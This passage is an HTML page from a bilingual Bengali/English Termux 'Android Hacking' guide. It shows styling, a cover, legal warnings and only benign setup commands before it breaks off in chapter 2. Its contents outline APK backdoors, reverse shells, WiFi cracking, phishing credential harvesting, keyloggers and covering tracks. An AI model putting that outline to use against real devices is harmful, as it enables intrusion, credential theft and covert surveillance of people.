@@ -1,0 +1,1867 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Android Hacking (Termux-based) — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --primary: #0d1b2a;
+    --accent: #e63946;
+    --green: #2dc653;
+    --yellow: #ffd60a;
+    --blue: #0077b6;
+    --purple: #7b2d8b;
+    --orange: #f4831f;
+    --teal: #00b4d8;
+    --code-bg: #0d1117;
+    --code-border: #30363d;
+    --text: #1a1a2e;
+    --bg: #f0f2f5;
+    --card: #ffffff;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Hind Siliguri','Noto Sans Bengali',sans-serif; background:var(--bg); color:var(--text); font-size:14px; line-height:1.9; }
+
+  /* ═══ COVER ═══ */
+  .cover {
+    background: linear-gradient(135deg, #0a1f0a 0%, #0d2b0d 40%, #001a0a 100%);
+    color:white; min-height:100vh; display:flex; flex-direction:column;
+    align-items:center; justify-content:center; text-align:center;
+    padding:60px 40px; page-break-after:always; position:relative; overflow:hidden;
+  }
+  .cover::before {
+    content:''; position:absolute; top:0; left:0; right:0; bottom:0;
+    background: repeating-linear-gradient(0deg,transparent,transparent 30px,
+      rgba(45,198,83,0.04) 30px,rgba(45,198,83,0.04) 31px);
+  }
+  .cover-icon { font-size:90px; margin-bottom:20px; position:relative; }
+  .cover h1 { font-size:42px; font-weight:700; color:#2dc653; text-shadow:0 0 30px rgba(45,198,83,0.6); }
+  .cover h2 { font-size:22px; font-weight:400; opacity:0.8; margin:10px 0 25px; }
+  .cover .divider { width:120px; height:3px; background:var(--accent); margin:20px auto; border-radius:2px; }
+  .cover .desc { font-size:16px; opacity:0.7; max-width:650px; line-height:2; }
+  .cover .badges { margin-top:30px; }
+  .cover .badge {
+    display:inline-block; background:rgba(45,198,83,0.12);
+    border:1px solid rgba(45,198,83,0.35); padding:6px 18px;
+    border-radius:20px; margin:5px; font-size:13px; color:#a8f5c0;
+  }
+  .cover .terminal {
+    background:rgba(0,0,0,0.6); border:1px solid rgba(45,198,83,0.4);
+    border-radius:10px; padding:20px 30px; margin-top:30px;
+    font-family:'Courier New',monospace; font-size:13.5px;
+    color:#2dc653; text-align:left; max-width:540px;
+  }
+  .cover .terminal .prompt { color:#89b4fa; }
+  .cover .terminal .out { color:#ffffff; }
+
+  /* ═══ TOC ═══ */
+  .toc { background:white; padding:50px 60px; page-break-after:always; }
+  .toc-header { font-size:30px; color:var(--primary); border-bottom:4px solid #2dc653; padding-bottom:15px; margin-bottom:35px; }
+  .toc-chapter { margin-bottom:5px; }
+  .toc-main { display:flex; justify-content:space-between; padding:10px 0; font-weight:700; font-size:16px; color:var(--primary); border-bottom:1px solid #eee; margin-top:15px; }
+  .toc-main .num { color:#2dc653; margin-right:10px; }
+  .toc-sub { display:flex; justify-content:space-between; padding:5px 0 5px 30px; color:#666; font-size:13.5px; border-bottom:1px dotted #f0f0f0; }
+
+  /* ═══ CHAPTERS ═══ */
+  .chapter { background:white; margin:0; page-break-before:always; }
+  .chapter-header { padding:40px 55px; position:relative; overflow:hidden; }
+  .ch1  .chapter-header { background:linear-gradient(135deg,#0a1f0a,#1a4731); }
+  .ch2  .chapter-header { background:linear-gradient(135deg,#001a0d,#003d20); }
+  .ch3  .chapter-header { background:linear-gradient(135deg,#0a2000,#204000); }
+  .ch4  .chapter-header { background:linear-gradient(135deg,#001a1a,#003d3d); }
+  .ch5  .chapter-header { background:linear-gradient(135deg,#1a0a2e,#3d1f5c); }
+  .ch6  .chapter-header { background:linear-gradient(135deg,#1b0000,#4a0000); }
+  .ch7  .chapter-header { background:linear-gradient(135deg,#000d1a,#001a33); }
+  .ch8  .chapter-header { background:linear-gradient(135deg,#1a1000,#3d2800); }
+  .ch9  .chapter-header { background:linear-gradient(135deg,#0d1b2a,#1b3a4b); }
+  .ch10 .chapter-header { background:linear-gradient(135deg,#0d0d2b,#1a1a4f); }
+  .ch11 .chapter-header { background:linear-gradient(135deg,#1a0010,#400025); }
+  .ch12 .chapter-header { background:linear-gradient(135deg,#0a1f0a,#1a4030); }
+  .ch13 .chapter-header { background:linear-gradient(135deg,#1a1a00,#3d3d00); }
+  .ch14 .chapter-header { background:linear-gradient(135deg,#0d1b2a,#2d1b69); }
+  .chapter-header::after { content:''; position:absolute; top:-30px; right:-30px; width:150px; height:150px; border-radius:50%; background:rgba(255,255,255,0.03); }
+  .chapter-label { font-size:11px; letter-spacing:4px; color:#2dc653; text-transform:uppercase; margin-bottom:10px; }
+  .chapter-title { font-size:30px; color:white; font-weight:700; }
+  .chapter-desc { font-size:14px; color:rgba(255,255,255,0.6); margin-top:8px; }
+  .chapter-body { padding:40px 55px; }
+
+  /* ═══ HEADINGS ═══ */
+  h2.sec { font-size:22px; color:var(--primary); margin:35px 0 15px; padding-left:18px; border-left:5px solid #2dc653; }
+  h3.sub { font-size:17px; color:#1b3a4b; margin:25px 0 12px; padding-bottom:6px; border-bottom:2px dashed #e0e0e0; }
+  h4.mini { font-size:15px; color:#333; margin:18px 0 8px; font-weight:600; }
+  p { margin-bottom:14px; text-align:justify; }
+
+  /* ═══ CODE ═══ */
+  .code {
+    background:var(--code-bg); color:#c9d1d9; padding:20px 25px; border-radius:10px;
+    font-family:'Courier New',monospace; font-size:13px; margin:18px 0;
+    line-height:1.9; overflow-x:auto; border:1px solid var(--code-border);
+    border-left:4px solid #2dc653;
+  }
+  .code .c  { color:#6e7681; }
+  .code .k  { color:#ff7b72; }
+  .code .s  { color:#a5d6ff; }
+  .code .p  { color:#89b4fa; }
+  .code .g  { color:#2dc653; }
+  .code .y  { color:#e3b341; }
+  .code .r  { color:#ff7b72; }
+  .code .t  { color:#00b4d8; }
+  code { background:#1b2838; color:#2dc653; padding:2px 8px; border-radius:4px; font-family:'Courier New',monospace; font-size:13px; }
+
+  /* ═══ BOXES ═══ */
+  .box { padding:18px 22px; border-radius:10px; margin:20px 0; border-left:5px solid; }
+  .info    { background:#e8f4fd; border-color:#0077b6; color:#023e8a; }
+  .warn    { background:#fff8e6; border-color:#f4831f; color:#7b3f00; }
+  .danger  { background:#fde8ea; border-color:#e63946; color:#9b1d20; }
+  .success { background:#e8f8ed; border-color:#2dc653; color:#1a4731; }
+  .purple-box { background:#f3e8ff; border-color:#7b2d8b; color:#4a0072; }
+  .teal-box   { background:#e0f7fa; border-color:#00b4d8; color:#006577; }
+  .box-t { font-weight:700; margin-bottom:8px; font-size:15px; }
+
+  /* ═══ TABLES ═══ */
+  table { width:100%; border-collapse:collapse; margin:20px 0; font-size:13.5px; }
+  thead tr { background:var(--primary); color:white; }
+  th { padding:12px 15px; text-align:left; font-weight:600; }
+  td { padding:10px 15px; border-bottom:1px solid #eee; }
+  tr:nth-child(even) { background:#f8f9fa; }
+  tr:hover { background:#e8f8ed; }
+
+  /* ═══ DIAGRAM ═══ */
+  .diagram {
+    background:#0d1117; border:1px solid #30363d; border-radius:10px;
+    padding:22px; font-family:'Courier New',monospace; font-size:13px;
+    line-height:1.9; margin:20px 0; color:#c9d1d9; overflow-x:auto;
+  }
+  .diagram .dg { color:#2dc653; }
+  .diagram .dy { color:#e3b341; }
+  .diagram .db { color:#79c0ff; }
+  .diagram .dr { color:#ff7b72; }
+  .diagram .dt { color:#00b4d8; }
+
+  /* ═══ GRID ═══ */
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:18px; margin:20px 0; }
+  .grid3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; margin:20px 0; }
+  .card { background:#f8f9fa; border:1px solid #e0e0e0; border-radius:10px; padding:18px; }
+  .card h4 { color:var(--primary); margin-bottom:10px; font-size:15px; border-bottom:2px solid #2dc653; padding-bottom:6px; }
+  .card.danger-card { border-color:#e63946; }
+  .card.danger-card h4 { color:#e63946; border-color:#e63946; }
+  .card.success-card { border-color:#2dc653; }
+  .card.success-card h4 { color:#1a4731; border-color:#2dc653; }
+  .card.teal-card { border-color:#00b4d8; }
+  .card.teal-card h4 { color:#006577; border-color:#00b4d8; }
+
+  /* ═══ BADGE ═══ */
+  .badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:12px; font-weight:600; margin:2px; }
+  .badge-g { background:#d1e7dd; color:#0f5132; }
+  .badge-r { background:#fde8ea; color:#c1121f; }
+  .badge-y { background:#fff3cd; color:#856404; }
+  .badge-b { background:#cfe2ff; color:#084298; }
+  .badge-p { background:#f3e8ff; color:#4a0072; }
+  .badge-t { background:#e0f7fa; color:#006577; }
+
+  /* ═══ STEP FLOW ═══ */
+  .step-flow { display:flex; flex-direction:column; gap:0; margin:20px 0; }
+  .step-item { display:flex; gap:16px; align-items:flex-start; padding:16px 20px; border-radius:10px; margin-bottom:8px; border:1px solid #e0e0e0; background:#f8f9fa; }
+  .step-num { background:#2dc653; color:#0d1b2a; width:36px; height:36px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:16px; flex-shrink:0; }
+  .step-body { flex:1; }
+  .step-title { font-weight:700; font-size:15px; color:var(--primary); margin-bottom:4px; }
+  .step-desc { font-size:13.5px; color:#555; }
+  body.dark-mode .step-item { background:#1a2332; border-color:#2d3748; }
+  body.dark-mode .step-title { color:#e2e8f0; }
+  body.dark-mode .step-desc { color:#94a3b8; }
+
+  /* ═══ ROADMAP ═══ */
+  .roadmap-container { padding:20px 0; }
+  .roadmap-phase { display:flex; gap:20px; margin-bottom:30px; align-items:flex-start; }
+  .phase-number { min-width:52px; height:52px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:800; color:white; flex-shrink:0; box-shadow:0 4px 15px rgba(0,0,0,0.3); }
+  .phase-content { flex:1; }
+  .phase-title { font-size:18px; font-weight:700; margin-bottom:8px; }
+  .phase-desc { font-size:13.5px; color:#555; margin-bottom:10px; }
+  body.dark-mode .phase-desc { color:#94a3b8; }
+  .phase-items { display:flex; flex-wrap:wrap; gap:8px; }
+  .phase-item { padding:5px 14px; border-radius:20px; font-size:12.5px; font-weight:600; border:1.5px solid currentColor; }
+  .roadmap-arrow { text-align:center; font-size:28px; color:#2dc653; margin:-15px 0 10px 26px; }
+
+  /* ═══ CHEATSHEET ═══ */
+  .cheat-grid { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin:20px 0; }
+  @media (max-width:768px) { .cheat-grid,.grid2,.grid3 { grid-template-columns:1fr; } }
+  .cheat-card { background:var(--card); border:1px solid #e0e0e0; border-radius:10px; overflow:hidden; }
+  body.dark-mode .cheat-card { border-color:#2d3748; }
+  .cheat-card-header { padding:10px 16px; font-weight:700; font-size:14px; color:white; }
+  .cheat-row { display:flex; padding:6px 14px; border-bottom:1px solid #f0f0f0; font-size:12.5px; gap:12px; }
+  body.dark-mode .cheat-row { border-color:#1f2937; }
+  .cheat-row:last-child { border-bottom:none; }
+  .cheat-cmd { font-family:'Courier New',monospace; color:#2dc653; font-weight:600; min-width:200px; white-space:nowrap; }
+  body.dark-mode .cheat-cmd { color:#6ee7b7; }
+  .cheat-desc { color:#555; }
+  body.dark-mode .cheat-desc { color:#94a3b8; }
+
+  /* ═══ HIGHLIGHTS ═══ */
+  .hl { background:linear-gradient(135deg,#e8f8ed,#f0fff4); border:1px solid #2dc653; padding:15px 20px; border-radius:8px; margin:18px 0; }
+  .chapter-summary { background:linear-gradient(135deg,#0a1f0a,#1a4731); color:white; border-radius:12px; padding:25px 30px; margin-top:40px; }
+  .chapter-summary h3 { color:#2dc653; margin-bottom:15px; font-size:18px; }
+  .chapter-summary li { color:rgba(255,255,255,0.85); margin-bottom:6px; }
+  ul, ol { margin:12px 0 12px 25px; line-height:2; }
+  li { margin-bottom:4px; }
+
+  @media print {
+    .print-btn { display:none; }
+    body { background:white; }
+    .cover,.chapter-header,thead tr { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+    .code,.diagram { -webkit-print-color-adjust:exact; print-color-adjust:exact; }
+  }
+
+  /* ═══ DARK MODE ═══ */
+  body.light-mode { --bg:#f0f2f5; --card:#ffffff; --text:#1a1a2e; --code-bg:#0d1117; --code-border:#30363d; --toc-bg:#ffffff; --ch-body-bg:#ffffff; }
+  body.dark-mode  { --bg:#0a0f1a; --card:#111827; --text:#e2e8f0; --code-bg:#050a12; --code-border:#1f2937; --toc-bg:#111827; --ch-body-bg:#111827; }
+  body { background:var(--bg); color:var(--text); transition:background 0.3s,color 0.3s; }
+  body.dark-mode .toc { background:var(--toc-bg); color:var(--text); }
+  body.dark-mode .chapter,.dark-mode .chapter-body { background:var(--ch-body-bg); }
+  body.dark-mode h2.sec { color:#6ee7b7; }
+  body.dark-mode h3.sub { color:#90cdf4; border-color:#2d3748; }
+  body.dark-mode p { color:var(--text); }
+  body.dark-mode .toc-main { color:#e2e8f0; border-color:#2d3748; }
+  body.dark-mode .toc-header,.dark-mode .toc-sub { color:#e2e8f0; }
+  body.dark-mode .toc-sub { color:#94a3b8; }
+  body.dark-mode table { color:var(--text); }
+  body.dark-mode td { border-color:#2d3748; color:var(--text); }
+  body.dark-mode tr:nth-child(even) { background:#1a2332; }
+  body.dark-mode tr:hover { background:#0a2a15; }
+  body.dark-mode .card { background:#1a2332; border-color:#2d3748; color:var(--text); }
+  body.dark-mode .card h4 { color:#6ee7b7; }
+  body.dark-mode .info    { background:#0c2340; color:#90cdf4; }
+  body.dark-mode .warn    { background:#2a1a00; color:#fbbf24; }
+  body.dark-mode .danger  { background:#2a0a0a; color:#fc8181; }
+  body.dark-mode .success { background:#0a2a15; color:#6ee7b7; }
+  body.dark-mode .purple-box { background:#1a0a2a; color:#d8b4fe; }
+  body.dark-mode .teal-box   { background:#001a1f; color:#67e8f9; }
+  body.dark-mode .hl { background:#0a2a15; border-color:#2dc653; color:#6ee7b7; }
+  body.dark-mode code { background:#1e293b; color:#6ee7b7; }
+  body.dark-mode .diagram { background:#050a12; }
+
+  /* ═══ BILINGUAL ═══ */
+  .en-text { display:none; }
+  .bn-text { display:inline; }
+  body.lang-en .bn-text { display:none; }
+  body.lang-en .en-text { display:inline; }
+  .en-block { display:none; }
+  .bn-block { display:block; }
+  body.lang-en .bn-block { display:none; }
+  body.lang-en .en-block { display:block; }
+
+  /* ═══ BUTTONS ═══ */
+  .top-controls { position:fixed; top:20px; right:20px; display:flex; gap:10px; z-index:9999; align-items:center; }
+  .ctrl-btn { border:none; padding:10px 18px; border-radius:8px; font-size:14px; font-family:inherit; cursor:pointer; transition:all 0.3s; font-weight:600; box-shadow:0 4px 12px rgba(0,0,0,0.3); }
+  .lang-btn  { background:#0077b6; color:white; }
+  .lang-btn:hover  { background:#005f8e; transform:translateY(-2px); }
+  .theme-btn { background:#2dc653; color:#0d1b2a; }
+  .theme-btn:hover { background:#25a344; transform:translateY(-2px); }
+  .print-btn { background:#e63946; color:white; border:none; padding:10px 18px; border-radius:8px; font-size:14px; font-family:inherit; cursor:pointer; transition:all 0.3s; font-weight:600; box-shadow:0 4px 15px rgba(230,57,70,0.4); }
+  .print-btn:hover { background:#c1121f; transform:translateY(-2px); }
+
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  @media print { .top-controls { display:none; } }
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- ═══ COVER ═══ -->
+<div class="cover">
+  <div class="cover-icon">📱</div>
+  <h1>Android Hacking (Termux-based)</h1>
+  <h2>
+    <span class="bn-text">Termux দিয়ে Android Hacking — সম্পূর্ণ বাংলা গাইড</span>
+    <span class="en-text">Android Hacking with Termux — Complete Bilingual Guide</span>
+  </h2>
+  <div class="divider"></div>
+  <p class="desc">
+    <span class="bn-text">শুধু একটি Android Phone দিয়ে — Network Attack, APK Analysis, Metasploit, WiFi Testing, Post Exploitation এবং আরও অনেক কিছু শিখো।</span>
+    <span class="en-text">Using just an Android phone — Network attacks, APK Analysis, Metasploit, WiFi testing, Post Exploitation and much more.</span>
+  </p>
+  <div class="terminal">
+    <div><span class="prompt">hacker@termux</span>:~$ uname -a</div>
+    <div class="out">Android 14 — Termux v0.119 — ARM64</div>
+    <div><span class="prompt">hacker@termux</span>:~$ pkg install hacking-knowledge</div>
+    <div style="color:#2dc653">
+      <span class="bn-text">Installing: নেটওয়ার্ক হ্যাকিং + APK রিভার্স + মেটাসপ্লয়েট...</span>
+      <span class="en-text">Installing: Network Hacking + APK Reverse + Metasploit...</span>
+    </div>
+    <div><span class="prompt">hacker@termux</span>:~$ <span style="animation:blink 1s infinite;">█</span></div>
+  </div>
+  <div class="badges">
+    <span class="badge">📦 Termux Setup</span>
+    <span class="badge">🌐 Network Attack</span>
+    <span class="badge">📲 APK Analysis</span>
+    <span class="badge">💣 Metasploit</span>
+    <span class="badge">📡 WiFi Hacking</span>
+    <span class="badge">🕵️ OSINT</span>
+    <span class="badge">🔓 Post Exploitation</span>
+    <span class="badge">🔑 Password Attack</span>
+    <span class="badge">🛡️ Hardening</span>
+    <span class="badge">🏆 CTF Labs</span>
+  </div>
+</div>
+
+<!-- ═══ TOC ═══ -->
+<div class="toc">
+  <div class="toc-header">
+    <span class="bn-text">📋 বিষয়সূচি — সম্পূর্ণ তালিকা</span>
+    <span class="en-text">📋 Table of Contents — Full List</span>
+  </div>
+
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০১</span> <span class="bn-text">Android Hacking পরিচিতি ও Legal দিক</span><span class="en-text">Android Hacking Intro & Legal Aspects</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">কী শেখা যাবে, কেন শিখব, Ethics ও Legal সতর্কতা</span><span class="en-text">What you'll learn, why learn it, ethics & legal warnings</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০২</span> <span class="bn-text">Termux Setup ও Essential Tools</span><span class="en-text">Termux Setup & Essential Tools</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Termux install, pkg system, storage, Python, Go, Ruby setup</span><span class="en-text">Termux install, pkg system, storage, Python, Go, Ruby setup</span></span></div>
+    <div class="toc-sub"><span>Nethunter, Kali-Termux, Andronix, proot-distro</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৩</span> <span class="bn-text">Android Architecture ও Security Model</span><span class="en-text">Android Architecture & Security Model</span></span></div>
+    <div class="toc-sub"><span>Linux Kernel, Binder IPC, SELinux, Sandbox, Permissions</span></div>
+    <div class="toc-sub"><span>ADB (Android Debug Bridge) — সম্পূর্ণ গাইড</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৪</span> <span class="bn-text">Network Attacks — MITM, ARP Spoofing</span><span class="en-text">Network Attacks — MITM, ARP Spoofing</span></span></div>
+    <div class="toc-sub"><span>nmap, netdiscover, arpspoof, bettercap, tcpdump, Wireshark</span></div>
+    <div class="toc-sub"><span>SSL Stripping, DNS Spoofing, HTTP Sniffing</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৫</span> <span class="bn-text">APK Analysis ও Reverse Engineering</span><span class="en-text">APK Analysis & Reverse Engineering</span></span></div>
+    <div class="toc-sub"><span>apktool, jadx, dex2jar, MobSF — APK decompile করা</span></div>
+    <div class="toc-sub"><span><span class="bn-text">Hardcoded secrets, API keys, Manifest analysis</span><span class="en-text">Hardcoded secrets, API keys, manifest analysis</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৬</span> Metasploit in Termux — <span class="bn-text">Android Exploitation</span><span class="en-text">Android Exploitation</span></span></div>
+    <div class="toc-sub"><span>Metasploit install, msfvenom payload, msfconsole, sessions</span></div>
+    <div class="toc-sub"><span>Android APK backdoor, Reverse Shell, Meterpreter</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৭</span> WiFi Hacking — <span class="bn-text">Wireless Attacks</span><span class="en-text">Wireless Attacks</span></span></div>
+    <div class="toc-sub"><span>aircrack-ng, wifite, hashcat — WPA/WPA2 crack</span></div>
+    <div class="toc-sub"><span>Evil Twin, Deauth Attack, WPS Pin Attack</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৮</span> <span class="bn-text">Phishing ও Social Engineering</span><span class="en-text">Phishing & Social Engineering</span></span></div>
+    <div class="toc-sub"><span>zphisher, SocialFish, ngrok, cloudflared — credential harvest</span></div>
+    <div class="toc-sub"><span>SMS Spoofing, QR Code Phishing, Smishing</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">০৯</span> OSINT — <span class="bn-text">তথ্য সংগ্রহ</span><span class="en-text">Information Gathering</span></span></div>
+    <div class="toc-sub"><span>theHarvester, maltego, shodan, sherlock, holehe</span></div>
+    <div class="toc-sub"><span>Phone OSINT, Email OSINT, Social Media OSINT</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১০</span> <span class="bn-text">Password Attacks</span><span class="en-text">Password Attacks</span></span></div>
+    <div class="toc-sub"><span>hydra, medusa, hashcat, john — brute force & cracking</span></div>
+    <div class="toc-sub"><span>Wordlist generation, CeWL, cupp, crunch</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১১</span> Post Exploitation — <span class="bn-text">Access পাওয়ার পরে</span><span class="en-text">After Getting Access</span></span></div>
+    <div class="toc-sub"><span>Privilege Escalation, Persistence, Data Exfiltration</span></div>
+    <div class="toc-sub"><span>Covering Tracks, Keylogger, Screenshot, Camera Access</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১২</span> <span class="bn-text">Android Security Hardening — নিজেকে রক্ষা করো</span><span class="en-text">Android Security Hardening — Protect Yourself</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">Secure Android phone, Unknown APK, VPN, Firewall</span><span class="en-text">Secure Android phone, unknown APKs, VPN, firewall</span></span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১৩</span> CTF Practice ও <span class="bn-text">Lab Setup</span><span class="en-text">Lab Setup</span></span></div>
+    <div class="toc-sub"><span>HackTheBox Android, DIVA, InsecureBankv2, MSTG Crackmes</span></div>
+  </div>
+  <div class="toc-chapter">
+    <div class="toc-main"><span><span class="num">১৪</span> <span class="bn-text">Career Path, Resources ও Cheat Sheet</span><span class="en-text">Career Path, Resources & Cheat Sheet</span></span></div>
+    <div class="toc-sub"><span><span class="bn-text">সম্পূর্ণ Termux Cheat Sheet, Resources ও Career Guide</span><span class="en-text">Complete Termux Cheat Sheet, Resources & Career Guide</span></span></div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 1 ═══ -->
+<div class="chapter ch1">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 01</div>
+    <div class="chapter-title">📱 <span class="bn-text">Android Hacking পরিচিতি ও Legal দিক</span><span class="en-text">Android Hacking Intro & Legal Aspects</span></div>
+    <div class="chapter-desc"><span class="bn-text">কী শেখা যাবে, কেন শিখব, সঠিক Ethics এবং Legal সতর্কতা</span><span class="en-text">What you'll learn, why learn it, proper ethics and legal warnings</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🤔 <span class="bn-text">Android Hacking কী?</span><span class="en-text">What is Android Hacking?</span></h2>
+    <p>
+      <span class="bn-text">Android Hacking মানে Android Device ও Application-এর Security দুর্বলতা খুঁজে বের করা এবং সেগুলো বোঝা। Termux হলো Android-এর একটি Linux Terminal Emulator যা দিয়ে Professional Hacking Tools ব্যবহার করা যায় — কোনো Root ছাড়াই।</span>
+      <span class="en-text">Android Hacking means finding and understanding security weaknesses in Android devices and applications. Termux is a Linux Terminal Emulator for Android that allows you to use professional hacking tools — even without root.</span>
+    </p>
+    <div class="box success">
+      <div class="box-t">💡 <span class="bn-text">Termux কেন?</span><span class="en-text">Why Termux?</span></div>
+      <span class="bn-text">Laptop না থাকলেও Android Phone দিয়েই পুরো Penetration Testing করা সম্ভব। nmap, metasploit, sqlmap, hydra — সব Termux-এ চলে।</span>
+      <span class="en-text">Even without a laptop, you can do full penetration testing with just an Android phone. nmap, metasploit, sqlmap, hydra — all run in Termux.</span>
+    </div>
+
+    <h2 class="sec">⚖️ Legal ও Ethical <span class="bn-text">সতর্কতা</span><span class="en-text">Warnings</span></h2>
+    <div class="box danger">
+      <div class="box-t">🚨 <span class="bn-text">অত্যন্ত গুরুত্বপূর্ণ</span><span class="en-text">Extremely Important</span></div>
+      <span class="bn-text">Permission ছাড়া কারো Device, Network বা System hack করা Cybercrime। বাংলাদেশে Digital Security Act 2018-এর অধীনে কঠোর শাস্তি হতে পারে। শুধুমাত্র নিজের Device, নিজের Lab বা CTF-এ Practice করো।</span>
+      <span class="en-text">Hacking someone's device, network, or system without permission is a cybercrime. In Bangladesh this falls under the Digital Security Act 2018, with severe penalties. Only practice on your own device, your own lab, or CTF challenges.</span>
+    </div>
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>✅ <span class="bn-text">কোথায় করা যাবে</span><span class="en-text">Where It's Allowed</span></h4>
+        <ul>
+          <li><span class="bn-text">নিজের Android device ও network</span><span class="en-text">Your own Android device & network</span></li>
+          <li>CTF challenges (HackTheBox, TryHackMe)</li>
+          <li>Vulnerable apps (DIVA, InsecureBank)</li>
+          <li>Bug Bounty Programs (authorized)</li>
+          <li>Home Lab environment</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>❌ <span class="bn-text">যা কখনো করবে না</span><span class="en-text">Never Do This</span></h4>
+        <ul>
+          <li><span class="bn-text">অন্যের WiFi hack করা</span><span class="en-text">Hack someone else's WiFi</span></li>
+          <li><span class="bn-text">Public network-এ MITM attack</span><span class="en-text">MITM on public networks</span></li>
+          <li><span class="bn-text">Permission ছাড়া APK backdoor তৈরি</span><span class="en-text">Create APK backdoors without permission</span></li>
+          <li><span class="bn-text">Real target-এ attack করা</span><span class="en-text">Attack real targets</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🎯 <span class="bn-text">কী কী শেখা যাবে এই Guide-এ</span><span class="en-text">What You'll Learn in This Guide</span></h2>
+    <div class="grid3">
+      <div class="card"><h4>📡 Network</h4><p>MITM, ARP Spoofing, DNS Spoofing, Packet Sniffing, SSL Strip</p></div>
+      <div class="card"><h4>📲 APK</h4><p>Decompile, Reverse Engineer, Find secrets, Modify APK</p></div>
+      <div class="card teal-card"><h4>💣 Exploitation</h4><p>Metasploit, Payloads, Reverse Shell, Meterpreter sessions</p></div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📱 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📱 <span class="bn-text">Termux দিয়ে Professional Hacking Tools চালানো সম্ভব</span><span class="en-text">Professional hacking tools can run via Termux</span></li>
+        <li>⚖️ <span class="bn-text">শুধু নিজের Lab বা CTF-এ Practice করো</span><span class="en-text">Only practice in your own lab or CTF</span></li>
+        <li>🎓 <span class="bn-text">এই Guide সম্পূর্ণ Educational উদ্দেশ্যে</span><span class="en-text">This guide is entirely for educational purposes</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 2 ═══ -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 02</div>
+    <div class="chapter-title">⚙️ <span class="bn-text">Termux Setup ও Essential Tools</span><span class="en-text">Termux Setup & Essential Tools</span></div>
+    <div class="chapter-desc"><span class="bn-text">Termux থেকে Kali Linux পর্যন্ত — সম্পূর্ণ Environment তৈরির গাইড</span><span class="en-text">From Termux to Kali Linux — complete environment setup guide</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">📥 <span class="bn-text">Termux Install ও প্রথম Setup</span><span class="en-text">Termux Install & First Setup</span></h2>
+    <div class="box warn">
+      <div class="box-t">⚠️ <span class="bn-text">গুরুত্বপূর্ণ</span><span class="en-text">Important</span></div>
+      <span class="bn-text">Google Play-এর Termux outdated। সবসময় <strong>F-Droid</strong> থেকে Termux Download করো। f-droid.org → Termux।</span>
+      <span class="en-text">Termux on Google Play is outdated. Always download Termux from <strong>F-Droid</strong>. f-droid.org → Termux.</span>
+    </div>
+    <div class="code">
+<span class="c"># প্রথমবার Termux খুলে এগুলো করো</span>
+pkg update && pkg upgrade -y
+
+<span class="c"># Essential packages</span>
+pkg install -y git curl wget python python-pip \
+  nodejs ruby golang openssh nmap \
+  net-tools iproute2 dnsutils
+
+<span class="c"># Storage permission দাও</span>
+termux-setup-storage
+
+<span class="c"># Python pip update</span>
+pip install --upgrade pip
+
+<span class="c"># Go environment setup</span>
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+echo 'export GOPATH=$HOME/go' >> ~/.bashrc
+echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
+    </div>
+
+    <h2 class="sec">🐉 Kali Linux in Termux (proot-distro)</h2>
+    <p><span class="bn-text">proot-distro ব্যবহার করে Termux-এর ভেতরে পুরো Kali Linux চালানো যায়। Root ছাড়াই।</span><span class="en-text">Using proot-distro, you can run a full Kali Linux inside Termux — even without root.</span></p>
+    <div class="code">
+<span class="c"># proot-distro install করো</span>
+pkg install proot-distro
+
